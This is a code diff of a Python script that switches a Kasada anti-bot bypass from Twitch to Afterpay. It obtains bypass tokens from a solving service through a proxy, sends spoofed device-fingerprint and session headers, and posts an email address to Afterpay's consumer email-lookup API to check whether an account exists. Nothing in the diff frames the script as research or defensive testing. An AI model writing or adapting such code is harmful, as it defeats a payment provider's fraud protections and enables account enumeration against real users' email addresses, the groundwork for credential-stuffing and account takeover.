@@ -14,9 +14,9 @@ def get_ct():
     payload = {
         "task_type": "kasada",
         "proxy": PROXY,
-        "target_url": "https://www.twitch.tv/",
-        "protected_api_domain": "gql.twitch.tv",
-        "kasada_js_domain": "k.twitchcdn.net"
+        "target_url": "https://portal.afterpay.com/en-US?next=%2F%3Futm_source%3DAfterpay%26utm_medium%3Dlink%26utm_campaign%3DAfterpay%2520Login%26utm_content%3DNavDirect&sort=orderDate&direction=descending&page=1&redirectShopUrl=https%3A%2F%2Fwww.afterpay.com%2Fen-US",
+        "protected_api_domain": "portalapi.us.afterpay.com",
+        "kasada_js_domain": "portalapi.us.afterpay.com"
     }
 
     session = requests.Session()
@@ -78,7 +78,7 @@ def get_ct():
             print("UNKNOWN:", j)
             return
 
-def get_cd(ct, st, fc, site='twitch'):
+def get_cd(ct, st, fc, site='afterpay'):
     # Task JSON payload
     payload = {
         "task_type": "kasada_cd",
@@ -161,18 +161,14 @@ if __name__ == "__main__":
     sec_ch_ua_platform = kasada_args['sec-ch-ua-platform'] # Get the sec-ch-ua-platform
 
     headers = {
-        'accept': '*/*',
+        'accept': 'application/json, text/plain, */*',
         'accept-language': 'en',
         'cache-control': 'no-cache',
-        'client-id': 'kimne78kx3ncx6brgo4mv6wki5h1ko',
-        'client-request-id': 'OLLeT9axGzXDvwN3T4dp9XKHJ3wiI31a',
-        'client-session-id': 'a099553b2749aca0',
-        'client-version': '87438f7e-baa7-44a5-ad55-787e0a959b1d',
-        # 'content-length': '0',
-        'origin': 'https://www.twitch.tv',
+        'content-type': 'application/json',
+        'origin': 'https://portal.afterpay.com',
         'pragma': 'no-cache',
         'priority': 'u=1, i',
-        'referer': 'https://www.twitch.tv/',
+        'referer': 'https://portal.afterpay.com/',
         'sec-ch-ua': sec_ch_ua,
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': sec_ch_ua_platform,
@@ -180,12 +176,25 @@ if __name__ == "__main__":
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
         'user-agent': user_agent,
-        'x-device-id': 'nUBB0WF39t2ZChA888eq66vxi01Wx3NM',
+        'x-amplitude-session-id': '1764323316657',
+        'x-device-fingerprint': '{"fingerprint":"f469279f102c3016c0f34eaec16a4bdd","language":"en","timezoneOffset":-480,"resolution":"864x1536"}',
         'x-kpsdk-cd': cd,
         'x-kpsdk-ct': ct,
         'x-kpsdk-h': h,
         'x-kpsdk-v': v,
+        'x-profiling-session-id': 'a879c6a3-5699-4604-813b-d1d65d93968e',
+        'x-requested-with': 'client:portal-redesign-v1',
     }
 
-    response = c_requests.post('https://gql.twitch.tv/integrity', headers=headers, proxy=PROXY)
+    json_data = {
+        'email': 'a123456789@gmail.com',
+        'isFromRegistration': False,
+    }
+
+    response = c_requests.post(
+        'https://portalapi.us.afterpay.com/portal/consumers/emails/lookup',
+        headers=headers,
+        json=json_data,
+        proxy=PROXY
+    )
     print(response.text)
